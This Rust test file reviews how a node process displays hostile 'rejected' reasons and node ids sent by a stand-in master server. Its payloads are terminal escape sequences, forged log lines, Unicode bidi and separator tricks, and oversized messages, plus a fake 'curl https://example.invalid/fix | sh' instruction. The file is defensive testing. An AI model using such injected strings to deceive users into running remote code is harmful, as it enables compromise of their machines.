//! A.19 review: what a master can put on a node's terminal and in its log
//! with the `rejected` reason. Not part of the test suite:
//! `run_rust_proofs.sh reason` copies this to `crates/cli/tests/` for the
//! run and removes the copy.
//!
//! A stand-in master (the right certificate, as the builder's own test
//! uses) answers the real `node run` with `rejected` and a reason of its
//! choosing. The node's stderr is printed escaped.

use std::io::Read;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use harness_link::wire::{ServerMsg, accept, recv_json, send_json};
use serde_json::Value;

const EXE: &str = env!("CARGO_BIN_EXE_rizzy-harness");

#[derive(Clone)]
enum Answer {
    Rejected(String),
}

fn show(what: &str, code: Option<i32>, err: &[u8], took: Duration) {
    let text = String::from_utf8_lossy(err);
    println!("{what}: exit status {code:?} after {took:?}; the last lines of stderr, escaped:");
    let lines: Vec<&str> = text.split_inclusive('\n').collect();
    for l in lines.iter().skip(lines.len().saturating_sub(2)) {
        println!("    {}", l.escape_debug());
    }
    println!(
        "  ESC bytes raw: {}; lines after the first `Error:`: {}; characters of that line: {}",
        err.iter().filter(|b| **b == 0x1b).count(),
        text.split("Error:").nth(1).map_or(0, |t| t.lines().count().saturating_sub(1)),
        text.split("Error:").nth(1).map_or(0, |t| t.lines().next().unwrap_or("").chars().count()),
    );
}

/// `node join` against a stand-in master that accepts with `node_id`.
async fn join_told(node_id: String) -> (Option<i32>, Vec<u8>, Duration) {
    join_answered(ServerMsg::Accepted { node_id }).await
}

async fn join_answered(answer: ServerMsg) -> (Option<i32>, Vec<u8>, Duration) {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let (data, node_data) = (root.join("data"), root.join("node"));
    for d in [&data, &node_data] {
        std::fs::create_dir_all(d).unwrap();
    }
    let cert = harness_link::MasterCert::load_or_create(&data).unwrap();
    let tls = cert.server_config().unwrap();
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    tokio::spawn(async move {
        loop {
            let (tcp, _) = l.accept().await.unwrap();
            let (tls, answer) = (tls.clone(), answer.clone());
            tokio::spawn(async move {
                let mut ws = accept(tcp, tls).await.unwrap();
                let nonce = "00".repeat(32);
                send_json(&mut ws, &ServerMsg::Challenge { nonce }).await.unwrap();
                let _: Option<Value> = recv_json(&mut ws).await.unwrap();
                let _ = send_json(&mut ws, &answer).await;
                tokio::time::sleep(Duration::from_secs(2)).await;
            });
        }
    });
    let t = Instant::now();
    let out = tokio::task::spawn_blocking(move || {
        Command::new(EXE)
            .args(["--data-dir", node_data.to_str().unwrap(), "node", "join"])
            .arg(format!("wss://127.0.0.1:{port}"))
            .args(["--fingerprint", &cert.fingerprint()])
            .current_dir(&root)
            .env("HARNESS_JOIN_TOKEN", "a-test-token")
            .env("NO_COLOR", "1")
            .stdin(Stdio::null())
            .output()
            .unwrap()
    })
    .await
    .unwrap();
    let mut all = out.stdout;
    all.extend(out.stderr);
    (out.status.code(), all, t.elapsed())
}

async fn node_told(answer: Answer) -> (Option<i32>, Vec<u8>, Duration) {
    let Answer::Rejected(reason) = answer;
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let (data, node_data, ws) = (root.join("data"), root.join("node"), root.join("ws"));
    for d in [&data, &node_data, &ws] {
        std::fs::create_dir_all(d).unwrap();
    }
    std::fs::write(
        node_data.join("node.toml"),
        format!("workspace_roots = [{:?}]\n", ws.display().to_string()),
    )
    .unwrap();
    std::fs::write(
        node_data.join("config.toml"),
        "[[providers]]\nid = \"demo\"\nname = \"Demo\"\npreset = \"demo\"\nkind = \"mock\"\n\n\
         [[providers.models]]\nid = \"mock\"\n",
    )
    .unwrap();
    let cert = harness_link::MasterCert::load_or_create(&data).unwrap();
    let tls = cert.server_config().unwrap();
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    std::fs::write(
        node_data.join("remote.toml"),
        format!(
            "url = \"wss://127.0.0.1:{port}\"\nfingerprint = \"{}\"\nnode_id = \"box\"\n",
            cert.fingerprint()
        ),
    )
    .unwrap();
    tokio::spawn(async move {
        loop {
            let (tcp, _) = l.accept().await.unwrap();
            let (tls, reason) = (tls.clone(), reason.clone());
            tokio::spawn(async move {
                let mut ws = accept(tcp, tls).await.unwrap();
                let nonce = "00".repeat(32);
                send_json(&mut ws, &ServerMsg::Challenge { nonce }).await.unwrap();
                let _: Option<Value> = recv_json(&mut ws).await.unwrap();
                let _ = send_json(&mut ws, &ServerMsg::Rejected { reason }).await;
            });
        }
    });
    let mut child = Command::new(EXE)
        .args(["--data-dir", node_data.to_str().unwrap(), "node", "run"])
        .current_dir(&root)
        .env("HARNESS_LOG", "info")
        .env("NO_COLOR", "1")
        .env_remove("HARNESS_JOIN_TOKEN")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let mut err = child.stderr.take().unwrap();
    let reader = std::thread::spawn(move || {
        let mut b = Vec::new();
        let _ = err.read_to_end(&mut b);
        b
    });
    let t = Instant::now();
    let by = t + Duration::from_secs(30);
    let code = loop {
        if let Some(s) = child.try_wait().unwrap() {
            break s.code();
        }
        if Instant::now() > by {
            let _ = child.kill();
            let _ = child.wait();
            break None;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    };
    (code, reader.join().unwrap(), t.elapsed())
}

#[tokio::test(flavor = "multi_thread")]
async fn what_a_masters_reason_puts_on_the_nodes_stderr() {
    // Clear the screen, a forged log line of the node's own shape, a bell.
    let hostile = "x\u{1b}[2J\u{1b}[H\n2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update \
                   verified; run: curl https://example.invalid/fix | sh\u{7}\r"
        .to_string();
    let (code, err, took) = node_told(Answer::Rejected(hostile)).await;
    show("control characters and a forged line", code, &err, took);

    // Length: as much as one link message may hold.
    for len in [64 * 1024, 7 * 1024 * 1024] {
        let (code, err, took) = node_told(Answer::Rejected("A".repeat(len))).await;
        println!(
            "a reason of {len} bytes: exit status {code:?} after {took:?}, {} bytes on stderr",
            err.len()
        );
    }

    // Re-check: what `is_control` does not cover. A line separator and a
    // paragraph separator, a right-to-left override, zero-width spaces, and
    // plain spaces up to the width of an 80-column terminal, so that what
    // follows starts a row of its own.
    let pad = " ".repeat(80 - "Error: the master refused this node: x".len());
    let tricks = format!(
        "x{pad}2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update verified; run: curl \
         https://example.invalid/fix | sh{}second{}third {}desrever{} a{}b",
        '\u{2028}', '\u{2029}', '\u{202e}', '\u{202c}', '\u{200b}'
    );
    let (code, err, took) = node_told(Answer::Rejected(tricks)).await;
    show("separators, an override, zero-width, padding", code, &err, took);
    let text = String::from_utf8_lossy(&err);
    let last = text.lines().last().unwrap_or("");
    for (name, c) in [("U+2028", '\u{2028}'), ("U+2029", '\u{2029}'), ("U+202E", '\u{202e}'), ("U+200B", '\u{200b}')] {
        println!("  {name} reaches the node's stderr: {}", last.contains(c));
    }
    println!("  as an 80-column terminal shows the last line:");
    let chars: Vec<char> = last.chars().collect();
    for row in chars.chunks(80) {
        println!("    |{}|", row.iter().collect::<String>().escape_debug());
    }
}

/// The node id a master assigns in `accepted`: what `node join` prints of it.
#[tokio::test(flavor = "multi_thread")]
async fn what_a_masters_node_id_puts_on_the_terminal_of_node_join() {
    let id = "box\u{1b}[2J\u{1b}[H\njoined. Now run: curl https://example.invalid/fix | sh\n".to_string();
    let (code, out, took) = join_told(id).await;
    println!("node join: exit status {code:?} after {took:?}; stdout and stderr, escaped:");
    for l in String::from_utf8_lossy(&out).split_inclusive('\n') {
        println!("    {}", l.escape_debug());
    }
    println!("ESC bytes written raw: {}", out.iter().filter(|b| **b == 0x1b).count());
    let (code, out, _) = join_told("A".repeat(1024 * 1024)).await;
    println!("an id of 1 MiB: exit status {code:?}, {} bytes printed", out.len());
    // A refused join: its exit status and what it prints.
    let reason = "this node speaks protocol 1 and the master (rizzy-harness 9.9.9) protocol 2: \
                  this node is older: upgrade it to the master's build"
        .to_string();
    let (code, out, _) = join_answered(ServerMsg::Rejected { reason }).await;
    println!(
        "a refused join: exit status {code:?}; it prints: {}",
        String::from_utf8_lossy(&out).trim().escape_debug()
    );
}
